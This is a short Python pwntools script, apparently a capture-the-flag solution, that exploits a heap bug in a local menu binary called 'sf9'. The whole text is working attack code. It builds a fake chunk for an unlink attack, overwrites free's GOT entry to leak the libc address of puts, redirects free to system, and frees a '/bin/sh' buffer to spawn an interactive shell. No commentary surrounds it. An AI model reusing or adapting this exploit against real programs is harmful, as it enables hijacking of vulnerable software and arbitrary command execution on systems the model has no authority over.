from pwn import*
p = process('./sf9')
t = 0.05

# gadget
puts_plt = 0x400760
puts_got = 0x602020
free_got = 0x602018

# definition

def keep(select,content):
        p.sendlineafter('3. Renew secret\n','1');sleep(t)
        p.sendline(str(select));sleep(t)
        p.send(content);sleep(t)

def wipe(select):
        p.sendlineafter('3. Renew secret\n','2');sleep(t)
        p.sendline(str(select));sleep(t)

def renew(select,content):
        p.sendlineafter('3. Renew secret\n','3');sleep(t)
        p.sendline(str(select));sleep(t)
        p.send(content);sleep(t)

# leak

sleep(3)
fake = ''
fake += p64(0)*2
fake += p64(0x6020D0-0x18)
fake += p64(0x6020d0-0x10)
fake += p8(0x20)
keep(1,fake)
keep(2,'bbbb')

keep(3,'cccc')
wipe(1) # unsorted bin

wipe(2) # unlink !!!

pay = ''
pay += 'a'*8            # 0x6020B8      --0x08
pay += p64(puts_got)    # big_calloc    --0x10
pay += 'c'*8            # huge_calloc   --0x18
pay += p64(free_got)    # small_calloc  --0x20
pay += p64(1)           # big_condition --0x28
renew(1,pay)

renew(1,p64(puts_plt))  # free_got = puts_plt 
wipe(2)                 # free(puts_got) -> puts(puts_got)
p.recvuntil('2. Big secret\n')

# exploit

libc_puts = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_puts - 456336
libc_system = libc_base + 283536
print 'libc_puts: '+hex(libc_puts)

renew(1,p64(libc_system))
keep(2,'/bin/sh\00')
wipe(2)

p.interactive()

